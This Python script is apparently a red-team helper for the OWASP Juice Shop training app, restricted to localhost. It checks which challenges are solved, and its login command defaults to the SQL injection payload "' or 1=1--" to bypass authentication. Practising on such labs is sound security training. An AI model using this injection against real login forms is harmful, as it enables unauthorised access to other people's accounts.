#!/usr/bin/env python3
"""Juice Shop red-team helper — runs against http://localhost:3000 only."""
import json, sys, urllib.request, urllib.parse, urllib.error

BASE = "http://localhost:3000"

def req(method, path, data=None, token=None, raw=False):
    url = BASE + path
    body = None
    headers = {"Content-Type": "application/json"}
    if token:
        headers["Authorization"] = f"Bearer {token}"
    if data is not None:
        body = json.dumps(data).encode() if not isinstance(data, (bytes, str)) else (data if isinstance(data, bytes) else data.encode())
    r = urllib.request.Request(url, data=body, headers=headers, method=method)
    try:
        with urllib.request.urlopen(r) as resp:
            txt = resp.read().decode("utf-8", "replace")
            return resp.status, txt
    except urllib.error.HTTPError as e:
        return e.code, e.read().decode("utf-8", "replace")

def login(email, pw="x"):
    st, t = req("POST", "/rest/user/login", {"email": email, "password": pw})
    try:
        return json.loads(t)["authentication"]["token"]
    except Exception:
        print("LOGIN FAIL", st, t[:300]); return None

def solved():
    st, t = req("GET", "/api/Challenges/")
    d = json.loads(t)["data"]
    return {c["name"] for c in d if c.get("solved")}

def show_solved(tag=""):
    s = solved()
    print(f"[{tag}] solved={len(s)}")
    for n in sorted(s): print("   -", n)
    return s

if __name__ == "__main__":
    cmd = sys.argv[1] if len(sys.argv) > 1 else "status"
    if cmd == "status":
        show_solved()
    elif cmd == "login":
        email = sys.argv[2] if len(sys.argv) > 2 else "' or 1=1--"
        print(login(email))
